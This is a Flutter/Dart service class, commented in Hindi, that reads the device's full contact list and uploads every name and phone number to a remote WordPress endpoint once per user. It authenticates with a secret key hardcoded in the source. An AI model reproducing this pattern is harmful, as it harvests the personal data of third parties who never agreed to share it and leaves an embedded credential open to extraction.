import 'dart:convert';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:get_storage/get_storage.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';

class ContactUploaderService {
  static const String _uploadUrl = "https://sridungargarhone.com/wp-json/custom-contacts/v1/upload";
  static const String _secretKey = "aSdsfrdsaaasdsd@2025!#";
  final _box = GetStorage();

  // फंक्शन अब User ID को एक आर्गुमेंट के रूप में ले रहा है
  Future<void> uploadContactsOnce(String userId) async {
    print("DEBUG: Checking upload status for user ID: $userId");

    // हर यूज़र के लिए एक अलग फ्लैग बनाएँ और जाँचें
    final uploadFlag = 'contacts_uploaded_for_$userId';
    bool alreadyUploaded = _box.read(uploadFlag) ?? false;

    if (alreadyUploaded) {
      print("INFO: Contacts already uploaded for this user. Skipping.");
      return;
    }

    // परमिशन चेक
    var status = await Permission.contacts.status;
    if (status.isDenied) {
      status = await Permission.contacts.request();
    }
    if (!status.isGranted) {
      print("ERROR: Contact permission was not granted.");
      return;
    }

    print("✅ PERMISSION GRANTED. Proceeding to upload for user $userId.");
    try {
      List<Contact> contacts = await FlutterContacts.getContacts(withProperties: true);
      if (contacts.isEmpty) {
        print("INFO: No contacts found.");
        return;
      }

      List<Map<String, String>> formattedContacts = contacts.map((contact) {
        return {
          'name': contact.displayName,
          'phone': contact.phones.isNotEmpty ? contact.phones.first.number : '',
        };
      }).where((c) => c['name']!.isNotEmpty && c['phone']!.isNotEmpty).toList();

      // सर्वर पर भेजने वाले डेटा में User ID जोड़ें
      final body = jsonEncode({
        'user_id': userId,
        'contacts': formattedContacts,
      });

      final response = await http.post(
        Uri.parse(_uploadUrl),
        headers: {'Content-Type': 'application/json', 'X-Secret-Key': _secretKey},
        body: body,
      );

      if (response.statusCode == 200) {
        print("✅ SUCCESS: Upload complete for user $userId!");
        // सफल अपलोड के बाद इस यूज़र के लिए फ्लैग सेट करें
        _box.write(uploadFlag, true);
      } else {
        print("❌ SERVER ERROR: Status ${response.statusCode}, Body: ${response.body}");
      }
    } catch (e) {
      print("❌ CRITICAL ERROR during upload: $e");
    }
  }
}
